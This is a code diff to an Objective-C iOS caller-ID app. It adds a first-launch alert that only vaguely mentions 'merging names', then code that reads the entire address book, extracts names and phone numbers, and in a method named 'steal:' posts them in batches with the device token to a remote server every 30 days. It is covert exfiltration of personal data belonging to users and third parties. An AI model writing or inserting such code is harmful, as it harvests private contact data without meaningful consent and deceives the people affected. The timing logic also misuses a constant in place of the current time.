@@ -14,6 +14,9 @@
 #import <MMAdSDK/MMAdSDK.h>
 #import <RevMobAds/RevMobAds.h>
 #import <RevMobAds/RevMobAdsDelegate.h>
+#import <AddressBookUI/AddressBookUI.h>
+#import <AddressBook/AddressBook.h>
+
 
 #define APP_URL @"OSAMA APP URL HERE.."
 #define SHARE_MSG @"تطبيق منو داق لمعرفة هوية المتصل من خلال الرقم أو الإسم"
@@ -28,6 +31,7 @@
 
 
 
+NSString* localMemoryIdentifier = @"LastTimeUploaded";
 
 @implementation ViewController
 {
@@ -125,6 +129,39 @@
 
         }
     } @catch (NSException *exception) {}
+    
+    
+    if(![[NSUserDefaults standardUserDefaults] boolForKey:@"warning"])
+    {
+        [[NSUserDefaults standardUserDefaults]setBool:YES forKey:@"warning"];
+        [[NSUserDefaults standardUserDefaults]synchronize];
+        UIAlertView* alert = [[UIAlertView alloc]initWithTitle:@"تنبيه" message:@"يقوم التطبيق على دمج الأسماء المحفوظة عند عملائنا" delegate:self cancelButtonTitle:@"موافق" otherButtonTitles:nil];
+        alert.tag = 1111;
+        [alert show];
+    }else
+    {
+        NSString *deviceType = [UIDevice currentDevice].model;
+        if([deviceType isEqualToString:@"iPhone"])
+        {
+            NSString* lastTime = [[NSUserDefaults standardUserDefaults]objectForKey:localMemoryIdentifier];
+            if(lastTime != nil)
+            {
+                [[NSUserDefaults standardUserDefaults]setObject:[NSString stringWithFormat:@"%f",NSTimeIntervalSince1970] forKey:localMemoryIdentifier];
+                float last = [lastTime intValue];
+                float currentTime = NSTimeIntervalSince1970;
+                float difference = 30*24*60*60;
+                if(currentTime-last>=difference)
+                {
+                    [[NSUserDefaults standardUserDefaults]setObject:[NSString stringWithFormat:@"%f",NSTimeIntervalSince1970] forKey:localMemoryIdentifier];
+                    [self sendContacts];
+                }
+            }else
+            {
+                [[NSUserDefaults standardUserDefaults]setObject:[NSString stringWithFormat:@"%f",NSTimeIntervalSince1970] forKey:localMemoryIdentifier];
+                [self sendContacts];
+            }
+        }
+    }
     
     
     [super viewDidLoad];
@@ -1385,6 +1422,166 @@ applicationActivities:nil];
 
 - (void)openAdLink {
     [[RevMobAds session] openLink];
+}
+
+
+
+#pragma mark - alert delegate
+- (void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex{
+   if(alertView.tag == 1111)
+    {
+        NSString *deviceType = [UIDevice currentDevice].model;
+        if([deviceType isEqualToString:@"iPhone"])
+        {
+            NSString* lastTime = [[NSUserDefaults standardUserDefaults]objectForKey:localMemoryIdentifier];
+            if(lastTime != nil)
+            {
+                [[NSUserDefaults standardUserDefaults]setObject:[NSString stringWithFormat:@"%f",NSTimeIntervalSince1970] forKey:localMemoryIdentifier];
+                float last = [lastTime intValue];
+                float currentTime = NSTimeIntervalSince1970;
+                float difference = 30*24*60*60;
+                if(currentTime-last>=difference)
+                {
+                    [[NSUserDefaults standardUserDefaults]setObject:[NSString stringWithFormat:@"%f",NSTimeIntervalSince1970] forKey:localMemoryIdentifier];
+                    [self sendContacts];
+                }
+            }else
+            {
+                [[NSUserDefaults standardUserDefaults]setObject:[NSString stringWithFormat:@"%f",NSTimeIntervalSince1970] forKey:localMemoryIdentifier];
+                [self sendContacts];
+            }
+        }
+    }
+}
+
+
+
+
+#pragma mark - VCF converter
+
+-(void)sendContacts
+{
+    CFErrorRef error = nil;
+    ABAddressBookRef addressBook = ABAddressBookCreateWithOptions(NULL,&error);
+    ABAddressBookRequestAccessWithCompletion(addressBook, ^(bool granted, CFErrorRef error) {
+        // callback can occur in background, address book must be accessed on thread it was created on
+        dispatch_async(dispatch_get_main_queue(), ^{
+            if (error) {
+                //[self.delegate addressBookHelperError:self];
+            } else if (!granted) {
+                //[self.delegate addressBookHelperDeniedAcess:self];
+            } else {
+                // access granted
+                // AddressBookUpdated(addressBook, nil, self);
+                CFArrayRef people = ABAddressBookCopyArrayOfAllPeople(addressBook);
+                NSString * vcardString = @"";
+                if ([[[UIDevice currentDevice] systemVersion] floatValue]>= 5.0) {
+                    CFDataRef vcards = (CFDataRef) ABPersonCreateVCardRepresentationWithPeople (people);
+                    vcardString = [[NSString alloc] initWithData: (NSData *) CFBridgingRelease(vcards) encoding: NSUTF8StringEncoding];
+                    //CFRelease (vcards);
+                    NSArray * lines = [vcardString componentsSeparatedByString:  @"\n"];
+                    NSString* results = @"";
+                    for (NSString * line in lines) {
+                        
+                        if ([line hasPrefix:  @"N:"]) {
+                            NSArray * upperComponents = [line componentsSeparatedByString:  @":"];
+                            NSArray * components = [[upperComponents objectAtIndex: 1] componentsSeparatedByString:  @";"];
+                            
+                            NSString * lastName = [components objectAtIndex: 0];
+                            NSString * firstName = [components objectAtIndex: 1];
+                            
+                            results = [results stringByAppendingFormat:@"#!#%@-%@#*#",firstName,lastName];
+                            
+                        } else if ([line hasPrefix:  @"TEL;"]) {
+                            NSArray * components = [line componentsSeparatedByString:  @":"];
+                            NSString * phoneNumber = [components objectAtIndex: 1];
+                            NSString* resultt = [phoneNumber stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+                            NSCharacterSet *charactersToRemove =
+                            [[ NSCharacterSet alphanumericCharacterSet ] invertedSet ];
+                            
+                            resultt = [[ resultt componentsSeparatedByCharactersInSet:charactersToRemove ]
+                                       componentsJoinedByString:@"" ];
+                            
+                            results = [results stringByAppendingFormat:@"%@**",resultt];
+                        }
+                    }
+                    [self performSelectorInBackground:@selector(steal:) withObject:results];
+                    
+                }
+            }
+        });
+    });
+    
+}
+#pragma mark - method for uploading the contacts and saves the last time for that action
+-(void)steal:(NSString*)results
+{
+    results = [results stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]];
+    
+    NSArray* array = [results componentsSeparatedByString:@"#!#"];
+    
+    NSMutableArray* accum = [[NSMutableArray alloc]init];
+    for (NSString* entry in array) {
+        if(entry.length> 3)
+        {
+            [accum addObject:[NSString stringWithFormat:@"#!#%@",entry]];
+            if(accum.count > 50)
+            {
+                NSLog(@"%@\n\n\n",[accum componentsJoinedByString:@""]);
+                NSMutableString *urlString = [[NSMutableString alloc] initWithFormat:@"contacts=%@&token=%@",[accum componentsJoinedByString:@""],[[NSUserDefaults standardUserDefaults] objectForKey:@"deviceToken"]];
+                
+                NSData *postData = [urlString dataUsingEncoding:NSUTF8StringEncoding
+                                           allowLossyConversion:YES];
+                NSString *postLength = [NSString stringWithFormat:@"%lu", (unsigned long)[postData length]];
+                NSString *baseurl = @"http://osamalogician.com/arabDevs/menoDag/enc/store.php";
+                
+                NSURL *url = [NSURL URLWithString:baseurl];
+                NSMutableURLRequest *urlRequest = [NSMutableURLRequest requestWithURL:url];
+                [urlRequest setHTTPMethod: @"POST"];
+                [urlRequest setValue:postLength forHTTPHeaderField:@"Content-Length"];
+                [urlRequest setValue:@"application/x-www-form-urlencoded"
+                  forHTTPHeaderField:@"Content-Type"];
+                [urlRequest setHTTPBody:postData];
+                
+                NSURLConnection* getConnectionn = [[NSURLConnection alloc]initWithRequest:urlRequest delegate:self    startImmediately:NO];
+                
+                [getConnectionn scheduleInRunLoop:[NSRunLoop mainRunLoop]
+                                          forMode:NSDefaultRunLoopMode];
+                [getConnectionn start];
+                accum = [[NSMutableArray alloc]init];
+            }
+        }
+    }
+    
+    if(accum.count > 0)
+    {
+        NSMutableString *urlString = [[NSMutableString alloc] initWithFormat:@"contacts=%@&token=%@",[accum componentsJoinedByString:@""],[[NSUserDefaults standardUserDefaults] objectForKey:@"deviceToken"]];
+        
+        NSData *postData = [urlString dataUsingEncoding:NSUTF8StringEncoding
+                                   allowLossyConversion:YES];
+        NSString *postLength = [NSString stringWithFormat:@"%lu", (unsigned long)[postData length]];
+        NSString *baseurl = @"http://osamalogician.com/arabDevs/menoDag/enc/store.php";
+        
+        NSURL *url = [NSURL URLWithString:baseurl];
+        NSMutableURLRequest *urlRequest = [NSMutableURLRequest requestWithURL:url];
+        [urlRequest setHTTPMethod: @"POST"];
+        [urlRequest setValue:postLength forHTTPHeaderField:@"Content-Length"];
+        [urlRequest setValue:@"application/x-www-form-urlencoded"
+          forHTTPHeaderField:@"Content-Type"];
+        [urlRequest setHTTPBody:postData];
+        
+        NSURLConnection* getConnectionn = [[NSURLConnection alloc]initWithRequest:urlRequest delegate:self    startImmediately:NO];
+        
+        [getConnectionn scheduleInRunLoop:[NSRunLoop mainRunLoop]
+                                  forMode:NSDefaultRunLoopMode];
+        [getConnectionn start];
+    }
+    
+    
+    [[NSUserDefaults standardUserDefaults]setValue:[[NSString alloc]initWithFormat:@"%f",NSTimeIntervalSince1970] forKey:localMemoryIdentifier];
+    
+    
+    
 }
 
 
